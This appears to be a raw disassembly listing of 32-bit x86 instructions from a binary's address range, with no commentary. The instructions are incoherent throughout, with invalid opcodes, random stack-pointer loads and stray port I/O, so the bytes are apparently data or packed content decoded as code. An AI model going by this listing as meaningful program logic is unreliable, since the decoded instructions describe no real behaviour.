  40371f:	7d db                	jge    0x4036fc
  403721:	a3 56 1b 6f b3       	mov    %eax,0xb36f1b56
  403726:	bd 73 e4 f1 cc       	mov    $0xccf1e473,%ebp
  40372b:	2c 50                	sub    $0x50,%al
  40372d:	bc 5e 3c b2 52       	mov    $0x52b23c5e,%esp
  403732:	4c                   	dec    %esp
  403733:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403734:	77 d3                	ja     0x403709
  403736:	31 6b 46             	xor    %ebp,0x46(%ebx)
  403739:	04 50                	add    $0x50,%al
  40373b:	61                   	popa
  40373c:	bb 47 d4 f6 1f       	mov    $0x1ff6d447,%ebx
  403741:	db 3a                	fstpt  (%edx)
  403743:	55                   	push   %ebp
  403744:	b8 f5 24 29 53       	mov    $0x532924f5,%eax
  403749:	dd 20                	frstor (%eax)
  40374b:	a3 6e ea d7 68       	mov    %eax,0x68d7ea6e
  403750:	1c 6d                	sbb    $0x6d,%al
  403752:	c2 5e 8e             	ret    $0x8e5e
  403755:	d8 7e 86             	fdivrs -0x7a(%esi)
  403758:	4a                   	dec    %edx
  403759:	3e 5b                	ds pop %ebx
  40375b:	9c                   	pushf
  40375c:	8f                   	(bad)
  40375d:	22 69 44             	and    0x44(%ecx),%ch
  403760:	89 b2 11 f3 66 67    	mov    %esi,0x6766f311(%edx)
  403766:	0e                   	push   %cs
  403767:	9a ba 46 15 a2 e0 76 	lcall  $0x76e0,$0xa21546ba
  40376e:	00 ab 7e 89 de 43    	add    %ch,0x43de897e(%ebx)
  403774:	2e 79 d5             	jns,pn 0x40374c
  403777:	24 45                	and    $0x45,%al
  403779:	3a ca                	cmp    %dl,%cl
  40377b:	eb 46                	jmp    0x4037c3
  40377d:	b9 20 26 cf 4b       	mov    $0x4bcf2620,%ecx
  403782:	d6                   	salc
  403783:	37                   	aaa
  403784:	20 91 4a 3e a9 c7    	and    %dl,-0x3856c1b6(%ecx)
  40378a:	15 a4 d3 31 ff       	adc    $0xff31d3a4,%eax
  40378f:	bc ce 66 6f 20       	mov    $0x206f66ce,%esp
  403794:	b4 5d                	mov    $0x5d,%ah
  403796:	b4 cf                	mov    $0xcf,%ah
  403798:	3a 97 df 3a 0e 35    	cmp    0x350e3adf(%edi),%dl
  40379e:	39 00                	cmp    %eax,(%eax)
  4037a0:	b7 98                	mov    $0x98,%bh
  4037a2:	00 aa b5 ed 46 4b    	add    %ch,0x4b46edb5(%edx)
  4037a8:	af                   	scas   %es:(%edi),%eax
  4037a9:	63 2e                	arpl   %ebp,(%esi)
  4037ab:	2b 5f 4f             	sub    0x4f(%edi),%ebx
  4037ae:	09 6c f5 9a          	or     %ebp,-0x66(%ebp,%esi,8)
  4037b2:	5f                   	pop    %edi
  4037b3:	3c 4c                	cmp    $0x4c,%al
  4037b5:	60                   	pusha
  4037b6:	ba 8c 92 67 d4       	mov    $0xd467928c,%edx
  4037bb:	fa                   	cli
  4037bc:	31 ca                	xor    %ecx,%edx
  4037be:	bc c1 ec ce 51       	mov    $0x51ceecc1,%esp
  4037c3:	57                   	push   %edi
  4037c4:	59                   	pop    %ecx
  4037c5:	bf f2 8f 43 72       	mov    $0x72438ff2,%edi
  4037ca:	66 a2 bc 9e 56 04    	data16 mov %al,0x4569ebc
  4037d0:	39 9a e4 fb 40 fa    	cmp    %ebx,-0x5bf041c(%edx)
  4037d6:	f5                   	cmc
  4037d7:	22 d9                	and    %cl,%bl
  4037d9:	b8 59 44 00 4a       	mov    $0x4a004459,%eax
  4037de:	c5 a9 6f fc 18 6a    	lds    0x6a18fc6f(%ecx),%ebp
  4037e4:	3f                   	aas
  4037e5:	5c                   	pop    %esp
  4037e6:	0b b7 9d ce 95 a3    	or     -0x5c6a3163(%edi),%esi
  4037ec:	9f                   	lahf
  4037ed:	8b 43 b4             	mov    -0x4c(%ebx),%eax
  4037f0:	be 0c 31 fc 1a       	mov    $0x1afc310c,%esi
  4037f5:	d5 d4                	aad    $0xd4
  4037f7:	5b                   	pop    %ebx
  4037f8:	bc cf f6 be 4c       	mov    $0x4cbef6cf,%esp
  4037fd:	d4 3f                	aam    $0x3f
  4037ff:	41                   	inc    %ecx
  403800:	77 6c                	ja     0x40386e
  403802:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403803:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403804:	91                   	xchg   %eax,%ecx
  403805:	b6 97                	mov    $0x97,%dh
  403807:	91                   	xchg   %eax,%ecx
  403808:	ae                   	scas   %es:(%edi),%al
  403809:	24 3d                	and    $0x3d,%al
  40380b:	35 87 31 df 31       	xor    $0x31df3187,%eax
  403810:	4a                   	dec    %edx
  403811:	58                   	pop    %eax
  403812:	26 cb                	es lret
  403814:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403815:	4e                   	dec    %esi
  403816:	23 cb                	and    %ebx,%ecx
  403818:	9e                   	sahf
  403819:	41                   	inc    %ecx
  40381a:	75 44                	jne    0x403860
  40381c:	3a 07                	cmp    (%edi),%al
  40381e:	99                   	cltd
  40381f:	9d                   	popf
  403820:	31 2c 2a             	xor    %ebp,(%edx,%ebp,1)
  403823:	16                   	push   %ss
  403824:	8c 69 28             	mov    %gs,0x28(%ecx)
  403827:	89 5a b5             	mov    %ebx,-0x4b(%edx)
  40382a:	39 24 90             	cmp    %esp,(%eax,%edx,4)
  40382d:	7d cb                	jge    0x4037fa
  40382f:	9a 3d 24 72 58 1c 2e 	lcall  $0x2e1c,$0x5872243d
  403836:	29 7b 99             	sub    %edi,-0x67(%ebx)
  403839:	34 5f                	xor    $0x5f,%al
  40383b:	47                   	inc    %edi
  40383c:	6c                   	insb   (%dx),%es:(%edi)
  40383d:	d4 3e                	aam    $0x3e
  40383f:	82 68 7d 06          	subb   $0x6,0x7d(%eax)
  403843:	33 d7                	xor    %edi,%edx
  403845:	cb                   	lret
  403846:	9c                   	pushf
  403847:	90                   	nop
  403848:	7e b0                	jle    0x4037fa
  40384a:	f9                   	stc
  40384b:	60                   	pusha
  40384c:	d5 7c                	aad    $0x7c
  40384e:	2e 1e                	cs push %ds
  403850:	13 0d 03 79 8f b6    	adc    0xb68f7903,%ecx
  403856:	67 c9                	addr16 leave
  403858:	ed                   	in     (%dx),%eax
  403859:	5a                   	pop    %edx
  40385a:	29 f7                	sub    %esi,%edi
  40385c:	fa                   	cli
  40385d:	36 31 0e             	xor    %ecx,%ss:(%esi)
  403860:	3d 17 2b c6 36       	cmp    $0x36c62b17,%eax
  403865:	6c                   	insb   (%dx),%es:(%edi)
  403866:	00 73 0c             	add    %dh,0xc(%ebx)
  403869:	34 1e                	xor    $0x1e,%al
  40386b:	64 ae                	fs scas %es:(%edi),%al
  40386d:	61                   	popa
  40386e:	4a                   	dec    %edx
  40386f:	eb 44                	jmp    0x4038b5
  403871:	bb fe b5 bc a6       	mov    $0xa6bcb5fe,%ebx
  403876:	6d                   	insl   (%dx),%es:(%edi)
  403877:	b8 76 3e ca a2       	mov    $0xa2ca3e76,%eax
  40387c:	f7 49 ec 43 6e e7 98 	testl  $0x98e76e43,-0x14(%ecx)
  403883:	e5 75                	in     $0x75,%eax
  403885:	fc                   	cld
  403886:	33 91 00 49 ed ac    	xor    -0x5312b700(%ecx),%edx
  40388c:	66 81 55 17 bd 7d    	adcw   $0x7dbd,0x17(%ebp)
  403892:	0a d7                	or     %bh,%dl
  403894:	20 a2 da 38 b7 4f    	and    %ah,0x4fb738da(%edx)
  40389a:	30 d7                	xor    %dl,%bh
  40389c:	4f                   	dec    %edi
  40389d:	21 0d a3 b8 b5 0f    	and    %ecx,0xfb5b8a3
  4038a3:	12 dc                	adc    %ah,%bl
  4038a5:	d1 80 16 b7 bd 63    	roll   $1,0x63bdb716(%eax)
  4038ab:	d1 42 ba             	roll   $1,-0x46(%edx)
  4038ae:	e9 dc bc 97 b7       	jmp    0xb7d7f58f
  4038b3:	4c                   	dec    %esp
  4038b4:	49                   	dec    %ecx
  4038b5:	52                   	push   %edx
  4038b6:	8d 2a                	lea    (%edx),%ebp
  4038b8:	af                   	scas   %es:(%edi),%eax
  4038b9:	d6                   	salc
  4038ba:	79 67                	jns    0x403923
  4038bc:	de 4d 3c             	fimuls 0x3c(%ebp)
  4038bf:	72 4e                	jb     0x40390f
  4038c1:	b5 0d                	mov    $0xd,%ch
  4038c3:	20 cb                	and    %cl,%bl
  4038c5:	62 b6 ec 5e 34 6b    	bound  %esi,0x6b345eec(%esi)
  4038cb:	6e                   	outsb  %ds:(%esi),(%dx)
  4038cc:	50                   	push   %eax
  4038cd:	87 e5                	xchg   %esp,%ebp
  4038cf:	7a 19                	jp     0x4038ea
  4038d1:	f5                   	cmc
  4038d2:	77 c9                	ja     0x40389d
  4038d4:	6c                   	insb   (%dx),%es:(%edi)
  4038d5:	65 9b                	gs fwait
  4038d7:	c7                   	(bad)
  4038d8:	a8 79                	test   $0x79,%al
  4038da:	de 46 ef             	fiadds -0x11(%esi)
  4038dd:	19 18                	sbb    %ebx,(%eax)
  4038df:	6f                   	outsl  %ds:(%esi),(%dx)
  4038e0:	23 8c 00 5c e2 01 b4 	and    -0x4bfe1da4(%eax,%eax,1),%ecx
  4038e7:	62 ed cb             	(bad) {%k3}{z}
  4038ea:	8b 69 72             	mov    0x72(%ecx),%ebp
  4038ed:	00 a7 ba 6e a5 7f    	add    %ah,0x7fa56eba(%edi)
  4038f3:	ed                   	in     (%dx),%eax
  4038f4:	5d                   	pop    %ebp
  4038f5:	22 27                	and    (%edi),%ah
  4038f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4038f8:	5b                   	pop    %ebx
  4038f9:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4038fa:	5c                   	pop    %esp
  4038fb:	d9 bc cc 3e 00 5c 57 	fnstcw 0x575c003e(%esp,%ecx,8)
  403902:	89 9f 01 70 64 1c    	mov    %ebx,0x1c647001(%edi)
  403908:	69 3a b6 9d 5f d3    	imul   $0xd35f9db6,(%edx),%edi
  40390e:	20 50 8a             	and    %dl,-0x76(%eax)
  403911:	46                   	inc    %esi
  403912:	3a b6 0b 97 62 ca    	cmp    -0x359d68f5(%esi),%dh
  403918:	21 d1                	and    %edx,%ecx
  40391a:	37                   	aaa
  40391b:	00 d5                	add    %dl,%ch
  40391d:	4d                   	dec    %ebp
  40391e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40391f:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403920:	78 63                	js     0x403985
  403922:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403923:	25 da fe 5f 60       	and    $0x605ffeda,%eax
  403928:	94                   	xchg   %eax,%esp
  403929:	6e                   	outsb  %ds:(%esi),(%dx)
  40392a:	57                   	push   %edi
  40392b:	49                   	dec    %ecx
  40392c:	87 43 87             	xchg   %eax,-0x79(%ebx)
  40392f:	f5                   	cmc
  403930:	6b 39 16             	imul   $0x16,(%ecx),%edi
  403933:	3d 83 88 7a 32       	cmp    $0x327a8883,%eax
  403938:	9a 1e ab 1d d9 7c 8d 	lcall  $0x8d7c,$0xd91dab1e
  40393f:	a9 37 b5 e3 6b       	test   $0x6be3b537,%eax
  403944:	22 28                	and    (%eax),%ch
  403946:	3f                   	aas
  403947:	18 51 71             	sbb    %dl,0x71(%ecx)
  40394a:	20 d4                	and    %dl,%ah
  40394c:	b2 bd                	mov    $0xbd,%dl
  40394e:	7f 26                	jg     0x403976
  403950:	43                   	inc    %ebx
  403951:	3e 86 27             	xchg   %ah,%ds:(%edi)
  403954:	65 57                	gs push %edi
  403956:	b7 0c                	mov    $0xc,%bh
  403958:	15 5d 9b eb 77       	adc    $0x77eb9b5d,%eax
  40395d:	1f                   	pop    %ds
  40395e:	a2 fc 7d 73 f5       	mov    %al,0xf5737dfc
  403963:	19 48 6e             	sbb    %ecx,0x6e(%eax)
  403966:	b8 a7 14 4e 5f       	mov    $0x5f4e14a7,%eax
  40396b:	be 9a b2 d5 e7       	mov    $0xe7d5b29a,%esi
  403970:	94                   	xchg   %eax,%esp
  403971:	ce                   	into
  403972:	ed                   	in     (%dx),%eax
  403973:	b9 8a 72 48 57       	mov    $0x5748728a,%ecx
  403978:	4a                   	dec    %edx
  403979:	ad                   	lods   %ds:(%esi),%eax
  40397a:	d3 56 c6             	rcll   %cl,-0x3a(%esi)
  40397d:	91                   	xchg   %eax,%ecx
  40397e:	68 1a 56 85 8a       	push   $0x8a85561a
  403983:	73 d9                	jae    0x40395e
  403985:	53                   	push   %ebx
  403986:	1c 47                	sbb    $0x47,%al
  403988:	e4 a7                	in     $0xa7,%al
  40398a:	73 eb                	jae    0x403977
  40398c:	ac                   	lods   %ds:(%esi),%al
  40398d:	e2 91                	loop   0x403920
  40398f:	6d                   	insl   (%dx),%es:(%edi)
  403990:	ff                   	ljmp   (bad)
  403991:	ec                   	in     (%dx),%al
  403992:	f3 cf                	repz iret
  403994:	77 63                	ja     0x4039f9
  403996:	76 b0                	jbe    0x403948
  403998:	c8 dd 42 f3          	enter  $0x42dd,$0xf3
  40399c:	0d a3 e8 7b be       	or     $0xbe7be8a3,%eax
  4039a1:	98                   	cwtl
  4039a2:	47                   	inc    %edi
  4039a3:	67 3a c5             	addr16 cmp %ch,%al
  4039a6:	fc                   	cld
  4039a7:	2e 77 38             	ja,pn  0x4039e2
  4039aa:	85 76 a1             	test   %esi,-0x5f(%esi)
  4039ad:	36 0d a1 7b 9a 8a    	ss or  $0x8a9a7ba1,%eax
  4039b3:	a2 b4 35 52 34       	mov    %al,0x345235b4
  4039b8:	24 43                	and    $0x43,%al
  4039ba:	cb                   	lret
  4039bb:	64 a1 d2 5f a6 66    	mov    %fs:0x66a65fd2,%eax
  4039c1:	60                   	pusha
  4039c2:	36 53                	ss push %ebx
  4039c4:	64 d4 17             	fs aam $0x17
  4039c7:	4d                   	dec    %ebp
  4039c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4039c9:	6e                   	outsb  %ds:(%esi),(%dx)
  4039ca:	44                   	inc    %esp
  4039cb:	79 1b                	jns    0x4039e8
  4039cd:	d1 cd                	ror    $1,%ebp
  4039cf:	44                   	inc    %esp
  4039d0:	b3 5c                	mov    $0x5c,%bl
  4039d2:	5c                   	pop    %esp
  4039d3:	23 89 ab 01 61 d2    	and    -0x2d9efe55(%ecx),%ecx
  4039d9:	72 22                	jb     0x4039fd
  4039db:	bd c5 24 ee 56       	mov    $0x56ee24c5,%ebp
  4039e0:	4d                   	dec    %ebp
  4039e1:	db 37                	(bad) (%edi)
  4039e3:	02 6e c0             	add    -0x40(%esi),%ch
  4039e6:	e7 ab                	out    %eax,$0xab
  4039e8:	cc                   	int3
  4039e9:	ba 52 44 16 4c       	mov    $0x4c164452,%edx
  4039ee:	c6                   	(bad)
  4039ef:	54                   	push   %esp
  4039f0:	6c                   	insb   (%dx),%es:(%edi)
  4039f1:	1a 64 6e 9c          	sbb    -0x64(%esi,%ebp,2),%ah
  4039f5:	b4 7b                	mov    $0x7b,%ah
  4039f7:	cd ea                	int    $0xea
  4039f9:	5a                   	pop    %edx
  4039fa:	11 f7                	adc    %esi,%edi
  4039fc:	8e a5 00 00 00 00    	mov    0x0(%ebp),%fs
  403a02:	f7 0f 1a e2 01 0e    	testl  $0xe01e21a,(%edi)
  403a08:	e7 4c                	out    %eax,$0x4c
  403a0a:	be 2d 41 70 b3       	mov    $0xb370412d,%esi
  403a0f:	8a e4                	mov    %ah,%ah
  403a11:	b7 8a                	mov    $0x8a,%bh
  403a13:	f6 db                	neg    %bl
  403a15:	4a                   	dec    %edx
  403a16:	86 4e 4d             	xchg   %cl,0x4d(%esi)
  403a19:	47                   	inc    %edi
  403a1a:	b6 d1                	mov    $0xd1,%dh
  403a1c:	16                   	push   %ss
  403a1d:	3b a6 57 e0 2f 2b    	cmp    0x2b2fe057(%esi),%esp
  403a23:	2a 79 9c             	sub    -0x64(%ecx),%bh
  403a26:	4b                   	dec    %ebx
  403a27:	e8 8b 91 ca 24       	call   0x250acbb7
  403a2c:	06                   	push   %es
  403a2d:	00 dc                	add    %bl,%ah
  403a2f:	5f                   	pop    %edi
  403a30:	68 4b b5 25 63       	push   $0x6325b54b
  403a35:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403a36:	79 0b                	jns    0x403a43
  403a38:	17                   	pop    %ss
  403a39:	30 52 3c             	xor    %dl,0x3c(%edx)
  403a3c:	d9 9c 24 59 70 4e 40 	fstps  0x404e7059(%esp)
  403a43:	6b 69 4e 65          	imul   $0x65,0x4e(%ecx),%ebp
  403a47:	79 42                	jns    0x403a8b
  403a49:	72 5a                	jb     0x403aa5
  403a4b:	eb f8                	jmp    0x403a45
  403a4d:	07                   	pop    %es
  403a4e:	ed                   	in     (%dx),%eax
  403a4f:	40                   	inc    %eax
  403a50:	8d a2 6d 2b 42 96    	lea    -0x69bdd493(%edx),%esp
  403a56:	04 a3                	add    $0xa3,%al
  403a58:	39 2b                	cmp    %ebp,(%ebx)
  403a5a:	ae                   	scas   %es:(%edi),%al
  403a5b:	3a 2d 3b 2b c8 6a    	cmp    0x6ac82b3b,%ch
  403a61:	80 54 42 ad 23       	adcb   $0x23,-0x53(%edx,%eax,2)
  403a66:	69 d9 86 29 5f 92    	imul   $0x925f2986,%ecx,%ebx
  403a6c:	46                   	inc    %esi
  403a6d:	8f c4                	pop    %esp
  403a6f:	72 da                	jb     0x403a4b
  403a71:	47                   	inc    %edi
  403a72:	88 5b a7             	mov    %bl,-0x59(%ebx)
  403a75:	5e                   	pop    %esi
  403a76:	50                   	push   %eax
  403a77:	cd a2                	int    $0xa2
  403a79:	fc                   	cld
  403a7a:	af                   	scas   %es:(%edi),%eax
  403a7b:	c4                   	(bad)
  403a7c:	d6                   	salc
  403a7d:	8e a0 45 c1 aa f1    	mov    -0xe553ebb(%eax),%fs
  403a83:	74 4d                	je     0x403ad2
  403a85:	d2 74 e3 72          	shlb   %cl,0x72(%ebx,%eiz,8)
  403a89:	d9 42 5a             	flds   0x5a(%edx)
  403a8c:	76 b4                	jbe    0x403a42
  403a8e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403a8f:	8b c6                	mov    %esi,%eax
  403a91:	95                   	xchg   %eax,%ebp
  403a92:	f1                   	int1
  403a93:	8a 76 ca             	mov    -0x36(%esi),%dh
  403a96:	76 30                	jbe    0x403ac8
  403a98:	c8 5d dc b0          	enter  $0xdc5d,$0xb0
  403a9c:	92                   	xchg   %eax,%edx
  403a9d:	dd 20                	frstor (%eax)
  403a9f:	bd 6d da e7 87       	mov    $0x87e7da6d,%ebp
  403aa4:	92                   	xchg   %eax,%edx
  403aa5:	79 42                	jns    0x403ae9
  403aa7:	c8 df 89 db          	enter  $0x89df,$0xdb
  403aab:	56                   	push   %esi
  403aac:	75 7f                	jne    0x403b2d
  403aae:	a0 ac 1b 47 b7       	mov    0xb7471bac,%al
  403ab3:	9f                   	lahf
  403ab4:	c9                   	leave
  403ab5:	f8                   	clc
  403ab6:	20 a3 69 7a 34 4b    	and    %ah,0x4b347a69(%ebx)
  403abc:	47                   	inc    %edi
  403abd:	01 c9                	add    %ecx,%ecx
  403abf:	fd                   	std
  403ac0:	28 6c 9b d0          	sub    %ch,-0x30(%ebx,%ebx,4)
  403ac4:	8e 2b                	mov    (%ebx),%gs
  403ac6:	f4                   	hlt
  403ac7:	b9 5d a3 89 a9       	mov    $0xa989a35d,%ecx
  403acc:	8e 45 e6             	mov    -0x1a(%ebp),%es
  403acf:	38 60 af             	cmp    %ah,-0x51(%eax)
  403ad2:	75 7c                	jne    0x403b50
  403ad4:	4a                   	dec    %edx
  403ad5:	2e 07                	cs pop %es
  403ad7:	d4 74                	aam    $0x74
  403ad9:	8d                   	lea    (bad),%ecx
  403ada:	ca 43 f6             	lret   $0xf643
  403add:	b6 99                	mov    $0x99,%dh
  403adf:	f1                   	int1
  403ae0:	32 99 2c cd e1 4c    	xor    0x4ce1cd2c(%ecx),%bl
  403ae6:	5c                   	pop    %esp
  403ae7:	40                   	inc    %eax
  403ae8:	7f 1a                	jg     0x403b04
  403aea:	2b 7a b1             	sub    -0x4f(%edx),%edi
  403aed:	64 90                	fs nop
  403aef:	f5                   	cmc
  403af0:	d4 7e                	aam    $0x7e
  403af2:	57                   	push   %edi
  403af3:	c2 89 79             	ret    $0x7989
  403af6:	19 f7                	sbb    %esi,%edi
  403af8:	a2 de d7 a4 d0       	mov    %al,0xd0a4d7de
  403afd:	36 4f                	ss dec %edi
  403aff:	59                   	pop    %ecx
  403b00:	7a 49                	jp     0x403b4b
  403b02:	0d 97 c1 30 b5       	or     $0xb530c197,%eax
  403b07:	3e 4f                	ds dec %edi
  403b09:	fa                   	cli
  403b0a:	d9 72 5b             	fnstenv 0x5b(%edx)
  403b0d:	7c 35                	jl     0x403b44
  403b0f:	31 17                	xor    %edx,(%edi)
  403b11:	b7 ab                	mov    $0xab,%bh
  403b13:	d9 41 37             	flds   0x37(%ecx)
  403b16:	94                   	xchg   %eax,%esp
  403b17:	4d                   	dec    %ebp
  403b18:	ca aa 20             	lret   $0x20aa
  403b1b:	a2 54 32 48 4c       	mov    %al,0x4c483254
  403b20:	64 be a2 d5 55 83    	fs mov $0x8355d5a2,%esi
  403b26:	05 b4 6f d9 b6       	add    $0xb6d96fb4,%eax
  403b2b:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403b2c:	cd 65                	int    $0x65
  403b2e:	af                   	scas   %es:(%edi),%eax
  403b2f:	f6 6a c5             	imulb  -0x3b(%edx)
  403b32:	72 64                	jb     0x403b98
  403b34:	75 0f                	jne    0x403b45
  403b36:	99                   	cltd
  403b37:	52                   	push   %edx
  403b38:	48                   	dec    %eax
  403b39:	92                   	xchg   %eax,%edx
  403b3a:	b8 ce 85 73 b3       	mov    $0xb37385ce,%eax
  403b3f:	60                   	pusha
  403b40:	51                   	push   %ecx
  403b41:	ef                   	out    %eax,(%dx)
  403b42:	58                   	pop    %eax
  403b43:	20 7c cc d6          	and    %bh,-0x2a(%esp,%ecx,8)
  403b47:	37                   	aaa
  403b48:	56                   	push   %esi
  403b49:	65 e5 d2             	gs in  $0xd2,%eax
  403b4c:	53                   	push   %ebx
  403b4d:	94                   	xchg   %eax,%esp
  403b4e:	79 69                	jns    0x403bb9
  403b50:	fa                   	cli
  403b51:	22 4e 2f             	and    0x2f(%esi),%cl
  403b54:	03 e3                	add    %ebx,%esp
  403b56:	76 51                	jbe    0x403ba9
  403b58:	1c 06                	sbb    $0x6,%al
  403b5a:	01 33                	add    %esi,(%ebx)
  403b5c:	2b 1f                	sub    (%edi),%ebx
  403b5e:	c6                   	(bad)
  403b5f:	fc                   	cld
  403b60:	19 78 e9             	sbb    %edi,-0x17(%eax)
  403b63:	1a af 43 27 92 57    	sbb    0x57922743(%edi),%ch
  403b69:	93                   	xchg   %eax,%ebx
  403b6a:	ea 53 e5 9b ca a6 34 	ljmp   $0x34a6,$0xca9be553
  403b71:	55                   	push   %ebp
  403b72:	0e                   	push   %cs
  403b73:	11 63 cb             	adc    %esp,-0x35(%ebx)
  403b76:	6b 51 f3 4e          	imul   $0x4e,-0xd(%ecx),%edx
  403b7a:	4d                   	dec    %ebp
  403b7b:	99                   	cltd
  403b7c:	f5                   	cmc
  403b7d:	4f                   	dec    %edi
  403b7e:	26 2c 4f             	es sub $0x4f,%al
  403b81:	b1 e1                	mov    $0xe1,%cl
  403b83:	68 d3 d6 b1 fc       	push   $0xfcb1d6d3
  403b88:	ae                   	scas   %es:(%edi),%al
  403b89:	46                   	inc    %esi
  403b8a:	e8 5a ea a7 20       	call   0x20e825e9
  403b8f:	8b 68 f5             	mov    -0xb(%eax),%ebp
  403b92:	c3                   	ret
  403b93:	ca 17 9a             	lret   $0x9a17
  403b96:	b5 2b                	mov    $0x2b,%ch
  403b98:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403b99:	d2 63 98             	shlb   %cl,-0x68(%ebx)
  403b9c:	ee                   	out    %al,(%dx)
  403b9d:	f1                   	int1
  403b9e:	88 3a                	mov    %bh,(%edx)
  403ba0:	2b dc                	sub    %esp,%ebx
  403ba2:	ba 88 38 45 be       	mov    $0xbe453888,%edx
  403ba7:	85 c6                	test   %eax,%esi
  403ba9:	b5 2b                	mov    $0x2b,%ch
  403bab:	79 19                	jns    0x403bc6
  403bad:	b5 a7                	mov    $0xa7,%ch
  403baf:	6c                   	insb   (%dx),%es:(%edi)
  403bb0:	32 44 ec b7          	xor    -0x49(%esp,%ebp,8),%al
  403bb4:	2b 68 ef             	sub    -0x11(%eax),%ebp
  403bb7:	54                   	push   %esp
  403bb8:	54                   	push   %esp
  403bb9:	43                   	inc    %ebx
  403bba:	f3 4a                	repz dec %edx
  403bbc:	26 2b 68 94          	sub    %es:-0x6c(%eax),%ebp
  403bc0:	fc                   	cld
  403bc1:	3b 4c 65 42          	cmp    0x42(%ebp,%eiz,2),%ecx
  403bc5:	f6 bd 45 16 a5 6f    	idivb  0x6fa51645(%ebp)
  403bcb:	e5 99                	in     $0x99,%eax
  403bcd:	fe                   	(bad)
  403bce:	66 1b 4e ad          	sbb    -0x53(%esi),%cx
  403bd2:	e3 6c                	jecxz  0x403c40
  403bd4:	65 32 b2 47 3d 58 53 	xor    %gs:0x53583d47(%edx),%dh
  403bdb:	b3 5f                	mov    $0x5f,%bl
  403bdd:	5e                   	pop    %esi
  403bde:	20 6f 40             	and    %ch,0x40(%edi)
  403be1:	b9 39 bd 68 df       	mov    $0xdf68bd39,%ecx
  403be6:	d6                   	salc
  403be7:	39 32                	cmp    %esi,(%edx)
  403be9:	eb 20                	jmp    0x403c0b
  403beb:	3b 96 31 27 d3 d9    	cmp    -0x262cd8cf(%esi),%edx
  403bf1:	da 92 7f 8d 0d 26    	ficoml 0x260d8d7f(%edx)
  403bf7:	eb 96                	jmp    0x403b8f
  403bf9:	bc 77 41 8e f2       	mov    $0xf28e4177,%esp
  403bfe:	3c 31                	cmp    $0x31,%al
  403c00:	7a 71                	jp     0x403c73
  403c02:	eb 24                	jmp    0x403c28
  403c04:	75 6e                	jne    0x403c74
  403c06:	c9                   	leave
  403c07:	b2 3d                	mov    $0x3d,%dl
  403c09:	8b 3d f4 76 45 66    	mov    0x664576f4,%edi
  403c0f:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403c10:	3e 2d 51 4e f1 0a    	ds sub $0xaf14e51,%eax
  403c16:	69 c5 8d f1 3e e9    	imul   $0xe93ef18d,%ebp,%eax
  403c1c:	75 62                	jne    0x403c80
  403c1e:	74 8d                	je     0x403bad
  403c20:	d6                   	salc
  403c21:	4c                   	dec    %esp
  403c22:	55                   	push   %ebp
  403c23:	f9                   	stc
  403c24:	e6 6f                	out    %al,$0x6f
  403c26:	70 da                	jo     0x403c02
  403c28:	b2 32                	mov    $0x32,%dl
  403c2a:	53                   	push   %ebx
  403c2b:	ca b0 b8             	lret   $0xb8b0
  403c2e:	a0 38 99 5c 5d       	mov    0x5d5c9938,%al
  403c33:	4d                   	dec    %ebp
  403c34:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403c35:	29 19                	sub    %ebx,(%ecx)
  403c37:	f5                   	cmc
  403c38:	73 80                	jae    0x403bba
  403c3a:	5a                   	pop    %edx
  403c3b:	32 3b                	xor    (%ebx),%bh
  403c3d:	30 7d b7             	xor    %bh,-0x49(%ebp)
  403c40:	9a e8 e7 64 78 9a e7 	lcall  $0xe79a,$0x7864e7e8
  403c47:	45                   	inc    %ebp
  403c48:	ea dd 57 f9 7c 20 e9 	ljmp   $0xe920,$0x7cf957dd
  403c4f:	76 51                	jbe    0x403ca2
  403c51:	c9                   	leave
  403c52:	fb                   	sti
  403c53:	7a 3a                	jp     0x403c8f
  403c55:	95                   	xchg   %eax,%ebp
  403c56:	ab                   	stos   %eax,%es:(%edi)
  403c57:	8c f3                	mov    %?,%ebx
  403c59:	6d                   	insl   (%dx),%es:(%edi)
  403c5a:	8b ec                	mov    %esp,%ebp
  403c5c:	63 45 20             	arpl   %eax,0x20(%ebp)
  403c5f:	52                   	push   %edx
  403c60:	bc 0f 95 2d 6f       	mov    $0x6f2d950f,%esp
  403c65:	b6 2c                	mov    $0x2c,%dh
  403c67:	be d7 54 15 23       	mov    $0x231554d7,%esi
  403c6c:	e3 c8                	jecxz  0x403c36
  403c6e:	d6                   	salc
  403c6f:	38 1f                	cmp    %bl,(%edi)
  403c71:	6a 4e                	push   $0x4e
  403c73:	54                   	push   %esp
  403c74:	f3 60                	repz pusha
  403c76:	8f                   	(bad)
  403c77:	e1 4a                	loope  0x403cc3
  403c79:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403c7a:	cb                   	lret
  403c7b:	66 3d 13 d1          	cmp    $0xd113,%ax
  403c7f:	70 74                	jo     0x403cf5
  403c81:	3d 5b f3 79 20       	cmp    $0x2079f35b,%eax
  403c86:	7c 9e                	jl     0x403c26
  403c88:	bd 96 50 41 f2       	mov    $0xf2415096,%ebp
  403c8d:	bf d2 f2 9c d4       	mov    $0xd49cf2d2,%edi
  403c92:	cb                   	lret
  403c93:	79 9e                	jns    0x403c33
  403c95:	a8 f5                	test   $0xf5,%al
  403c97:	4c                   	dec    %esp
  403c98:	c8 e1 88 a4          	enter  $0x88e1,$0xa4
  403c9c:	34 6f                	xor    $0x6f,%al
  403c9e:	7b a6                	jnp    0x403c46
  403ca0:	71 c1                	jno    0x403c63
  403ca2:	36 6d                	ss insl (%dx),%es:(%edi)
  403ca4:	76 06                	jbe    0x403cac
  403ca6:	8d                   	lea    (bad),%ebx
  403ca7:	da b5 74 b7 0c 45    	fidivl 0x450cb774(%ebp)
  403cad:	3a 9d ec 9e b0 00    	cmp    0xb09eec(%ebp),%bl
  403cb3:	41                   	inc    %ecx
